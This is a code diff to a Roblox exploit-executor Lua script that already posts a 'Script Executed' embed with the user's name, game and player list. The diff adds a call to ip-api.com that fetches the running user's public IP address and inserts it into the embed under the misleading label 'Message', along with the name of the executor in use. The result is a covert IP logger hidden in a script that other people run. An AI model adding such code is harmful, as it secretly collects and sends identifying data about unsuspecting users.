@@ -13,6 +13,16 @@ if not requestFunc then
 	return
 end
 
+local requestFunction = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+
+local ip_info = requestFunction({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = ipinfo_table.query
+local executor = getgenv().identifyexecutor and (getgenv().identifyexecutor()) or game["Run Service"]:IsStudio() and (game["Run Service"]:IsServer() and "Server" or "Client").."StudioApp" or game["Run Service"]:IsServer() and "Server" or "Client"
+
 local lastPlayerList = {}
 
 local function sendEmbed(title, desc, color)
@@ -63,16 +73,21 @@ local function sendInitial()
 	local currentPlayers = getPlayerNames()
 	lastPlayerList = currentPlayers
 
-	local desc = string.format("**User:** %s\n**Game:** [%s](https://www.roblox.com/games/%s)\n**Players:** %s\n**Time:** <t:%d:F>",
+	-- Assuming datamessage and executor are defined somewhere above or globally
+	local desc = string.format(
+		"**User:** %s\n**Game:** [%s](https://www.roblox.com/games/%s)\n**Players:** %s\n**Executor:** %s\n**Message:** %s\n**Time:** <t:%d:F>",
 		LocalPlayer.Name,
 		gameName,
 		tostring(game.PlaceId),
 		table.concat(currentPlayers, ", "),
+		executor or "Unknown",
+		dataMessage or "No message",
 		math.floor(os.time())
 	)
 
 	sendEmbed("Script Executed", desc, 0x00FF00)
 end
+
 
 -- Compare player list every 3 minutes
 task.spawn(function()
